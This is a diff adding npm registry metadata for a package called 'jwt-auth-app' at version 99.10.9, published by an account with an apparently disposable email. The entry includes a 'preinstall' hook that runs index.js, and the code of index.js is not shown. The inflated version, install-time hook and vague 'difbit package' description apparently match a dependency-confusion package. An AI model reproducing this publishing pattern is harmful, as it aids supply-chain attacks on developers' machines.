@@ -1,0 +1,62 @@
+{
+    "_id": "jwt-auth-app",
+    "name": "jwt-auth-app",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "jwt-auth-app",
+            "version": "99.10.9",
+            "description": "difbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "jwt-auth-app@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-wBFiIR5e/G5CN7u1uAqrsVJEGTRSLlLaE2onUY6Yqb2xAfK4i/HMyEVS1+r5QaiyVXjArgvITDuTmxwCjr4RgQ==",
+                "shasum": "b1680067072e0ea208aeb34a1503dabb1e47e344",
+                "tarball": "https://registry.npmjs.org/jwt-auth-app/-/jwt-auth-app-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 6711,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQy6hACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmoy1Q//aIGv4NTHjh03rXoencYOZJz6M/lQ5VLWs7sRnsiD3nOu4Owg\r\n/cwWYC/c0D3/VrAL4chAUETv8eIB+ZWnCoo6zBnAOQRFR1ubiPxnxbw0Zi2V\r\nBH7+ImG4k5H/fnSa/bMtH0jpdqHhfBqYtETFmOR/5l9VLM9JSqlgItERfwTH\r\nxoGWqIgz5Eays8Pgu80D3sS0/KI6tobk4DjPO0YfsQfXaod1bxyPdKjIp49Z\r\nqtATGg7Mx9fagD5Q2PGUHNMMRRP+tkD2QNEZVmF0MW2GT4AirEUk67U15/TP\r\nTMlMwGvNAYgG0G2/ajesH/u6ZV01RwFp64dAzRg+/rJwv+NcnZA+CsYGYsd/\r\nd4SW9iQ3k/51ZowzJSg1o1FESQObRS1S2TYUuP/Sflio2JxWN2MF3oU9NSfk\r\nfrKA2N3sxaLGSYkkrYAwx4i+Y9zTgxLylMNB/2eaOPrza7S/EMxUL+658d2P\r\n0jKyzi128zKMjVYAEHTEHichGRImPZhdoLMAfqUFN6vTnzlhBuoPbJ0SXK1H\r\nv63kkFFenswzi1ujPLnYgvLnXovEN9R1sZuJ0ChoSZAPIbky8eKvI32Pti/J\r\n1D3MZi+NTzkqrElSr54+4ofGjqaokvrmNVbV+HvIVgc2o3Bv1n1oY4KuJUmF\r\ntyoJIlhjWyRFodn3vSMwURJW+ZxCicM0mXM=\r\n=jHR4\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "1ouqtrad",
+                "email": "1ouqtrad@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "1ouqtrad",
+                    "email": "1ouqtrad@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/jwt-auth-app_99.10.9_1648570017565_0.9515599222278577"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-29T16:06:57.565Z",
+        "99.10.9": "2022-03-29T16:06:57.740Z",
+        "modified": "2022-03-29T16:06:57.895Z"
+    },
+    "maintainers": [
+        {
+            "name": "1ouqtrad",
+            "email": "1ouqtrad@33mail.ga"
+        }
+    ],
+    "description": "difbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
